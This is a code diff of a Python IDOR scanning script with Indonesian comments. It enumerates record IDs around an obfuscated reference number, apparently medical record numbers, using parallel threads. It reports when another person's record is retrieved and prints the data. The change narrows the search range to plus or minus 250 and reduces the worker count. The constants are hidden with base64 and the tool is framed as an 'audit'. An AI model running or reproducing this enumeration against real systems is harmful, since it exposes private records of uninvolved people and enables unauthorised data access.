@@ -190,9 +190,9 @@ def parameter_discovery_audit():
                     # 2. Automated Manipulation Test
                     print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
-                    # Persiapkan rentang tepat 1001 ID
+                    # Persiapkan rentang tepat 501 ID (250 sebelum, 1 acuan, 250 sesudah)
                     acuan_rm = int(_decode("MDA1MTA0ODE="))
-                    search_pool = list(range(acuan_rm - int(_decode("NTAw")), acuan_rm + int(_decode("NTAx"))))
+                    search_pool = list(range(acuan_rm - int(_decode("MjUw")), acuan_rm + int(_decode("MjUx"))))
                     random.shuffle(search_pool)
                     
                     found_event = threading.Event()
@@ -227,12 +227,12 @@ def parameter_discovery_audit():
                                         print(f" [!] {_decode('U3RhdHVz')}      : \033[91m{_decode('SURPUiBDb25maXJtZWQ=')}\033[0m")
                         except: pass
 
-                    print(f"[*] Threaded Search Started (10 Workers)...")
-                    with ThreadPoolExecutor(max_workers=10) as discovery_executor:
+                    print(f"[*] Threaded Search Started (5 Workers)...")
+                    with ThreadPoolExecutor(max_workers=5) as discovery_executor:
                         discovery_executor.map(check_id_vulnerability, search_pool)
                     
                     if not found_event.is_set():
-                        print(f"\n\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid.")
+                        print(f"\n\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid dalam radius +/- 250.")
                     
                     if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                         break
@@ -303,7 +303,7 @@ def vulnerability_audit():
 def start_process(id_list):
     if login():
         print(f"[*] Starting Accelerated Randomized IDOR Scan for {len(id_list)} records...\n")
-        with ThreadPoolExecutor(max_workers=10) as executor:
+        with ThreadPoolExecutor(max_workers=5) as executor:
             executor.map(fetch_data, id_list)
         print("\n[*] IDOR Audit Completed. Data displayed in terminal.")
 
